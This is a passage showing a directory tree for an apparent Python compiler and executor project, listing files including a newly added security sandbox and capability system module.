├── compiler.py
├── validator.py
├── builtins.py
├── sandbox.py            # NEW: Security sandbox
├── capabilities.py       # NEW: Capability system
├── python_executor.py    # Uses sandbox
└── loader.py
```
